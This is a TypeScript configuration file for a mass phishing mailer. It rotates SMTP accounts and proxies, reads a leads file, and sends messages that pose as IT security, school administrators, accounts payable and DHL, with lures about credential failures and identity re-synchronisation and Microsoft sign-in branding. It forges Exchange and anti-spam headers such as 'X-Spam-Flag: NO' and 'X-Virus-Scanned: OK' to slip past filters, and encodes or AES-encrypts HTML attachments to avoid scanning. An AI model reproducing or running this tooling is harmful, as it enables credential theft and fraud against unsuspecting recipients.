import dotenv from 'dotenv';
dotenv.config();

export interface SMTPAccount {
    host?: string;
    port?: string;
    auth: boolean;
    username?: string;
    password?: string;
    fromEmail?: string[] | string;
}

export interface CustomHeaders {
    [key: string]: string;
}

export interface EncryptionConfig {
    letter: {
        zeroFont_letter: boolean;
        base64_html_letter: boolean;
        base64_letter: boolean;
    };
    attachment: {
        obsfucate_html_attachment: boolean;
        zeroFont_html_attachment: boolean;
        base64_html_attachment: boolean;
        aes_html_attachment: boolean;
    };
}

export interface MessageConfig {
    fromName: string[];
    replyTo: string[];
    subject: string[];
}

export interface AppConfig {
    License: string;
    pauseAfter: number;
    pauseFor: number;
    fileName: string;
    textLetter: boolean;
    useHeader: boolean;
    useAttach: boolean;
    attachFilename: string[];
    links: string[];
    sleep: number;
    threads: number;
    date_format: number;
    time_format: number;
    multiple_proxy: string[];
    htmlAttach_to_pdf: boolean;
    html_to_image: boolean;
    bg_logo: string;
}

export interface Config {
    smtp: SMTPAccount[];
    custom_headers: CustomHeaders;
    encryption: EncryptionConfig;
    message: MessageConfig;
    config: AppConfig;
}



// Helper to handle comma-separated env values
const envArray = (key: string, defaultValue?: string[]): string[] => {
    const val = process.env[key];
    if (!val) return defaultValue || [];
    return val.split(',').map(s => s.trim().replace(/^"|"$/g, ''));
};

const getDynamicSmtp = (): SMTPAccount[] => {
    const accounts: SMTPAccount[] = [];
    let i = 1;
    while (process.env[`SMTP_HOST_${i}`]) {
        accounts.push({
            host: process.env[`SMTP_HOST_${i}`],
            port: process.env[`SMTP_PORT_${i}`],
            auth: true,
            username: process.env[`SMTP_USER_${i}`],
            password: process.env[`SMTP_PASS_${i}`],
            fromEmail: process.env[`SMTP_FROM_${i}`],
        });
        i++;
    }
    return accounts;
};

export const smtp: SMTPAccount[] = getDynamicSmtp();

export const custom_headers: CustomHeaders = {
    'X-Priority': '2',
    'X-MSMail-Priority': 'Normal',
    'importance': "Normal",
    'X-MS-Exchange-Organization-AuthAs': 'Internal',
    'X-MS-Exchange-Organization-AuthMechanism': '04',
    'X-MS-Exchange-Organization-AuthSource': 'AM6PR05MB6112.eurprd02.prod.outlook.com',
    'X-Mailer': 'Microsoft Office Outlook, Build 11.0.5510',
    'X-MimeOLE': 'Produced By Microsoft MimeOLE V6.00.2800.1441',
    'X-Peer': '127.0.0.1',
    'X-Recommended-Action': 'accept',
    'X-Spam-Category': 'LEGIT',
    'X-SpamCatcher-Score': '0',
    'X-Virus-Scanned': 'OK',
    'X-Attach-Flag': 'N',
    'x-live-global-disposition': 'G',
    'X-Suspicious-Flag': 'NO',
    'X-SpamFilter-By': 'BOX Solutions SpamTrap 3.5 with qID r0HNXZSI028539, This message is passed by code: ctdos35128',
    'X-Spam-Flag': 'NO',
    'X-SpamInfo': 'spam not detected',
};

export const encryption: EncryptionConfig = {
    letter: {
        zeroFont_letter: false,
        base64_html_letter: false,
        base64_letter: false,
    },
    attachment: {
        obsfucate_html_attachment: false,
        zeroFont_html_attachment: false,
        base64_html_attachment: true,
        aes_html_attachment: true
    }
};

export const message: MessageConfig = {
    fromName: envArray('EMAIL_FROM_NAMES', ['Security Department on Behalf of {{company}}', 'IT Administration at {{SchoolName}}', 'Accounts Payable - {{company}}', 'System Administrator <noreply@{{SchoolName}}>']),
    replyTo: envArray('EMAIL_REPLY_TO', ['']),
    subject: envArray('EMAIL_SUBJECTS', ['Security Notification: Credential Handshake Failure Detected - {{rnum}}', 'DHL Express: Final Delivery Notice for Shipment #{{TargetID}}', 'Action Required: Mandatory Identity Re-synchronization - {{date}}', 'Urgent: Security Synchronization Required for {{email}}']),
};

export const config: AppConfig = {
    License: process.env.LICENSE || "owner:769547FF-876C-11E4-8486-44510D17F8FF",
    pauseAfter: Number(process.env.PAUSE_AFTER) || 2000,
    pauseFor: Number(process.env.PAUSE_FOR) || 10,
    fileName: process.env.LEADS_FILE || "mail.txt",
    textLetter: process.env.TEXT_ONLY === 'true',
    useHeader: process.env.USE_HEADERS !== 'false',
    useAttach: process.env.USE_ATTACH === 'true',
    attachFilename: envArray('ATTACH_FILENAMES', ["Auth-Details.HTML-~"]),
    links: envArray('CAMPAIGN_LINKS', [""]),
    sleep: Number(process.env.SLEEP_INTERVAL) || 2,
    threads: Number(process.env.THREADS) || 5,
    date_format: Number(process.env.DATE_FORMAT) || 1,
    time_format: Number(process.env.TIME_FORMAT) || 2,
    multiple_proxy: envArray('PROXIES', [""]),
    htmlAttach_to_pdf: process.env.HTML_TO_PDF === 'true',
    html_to_image: process.env.HTML_TO_IMAGE === 'true',
    bg_logo: process.env.BG_LOGO || "https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg",
};
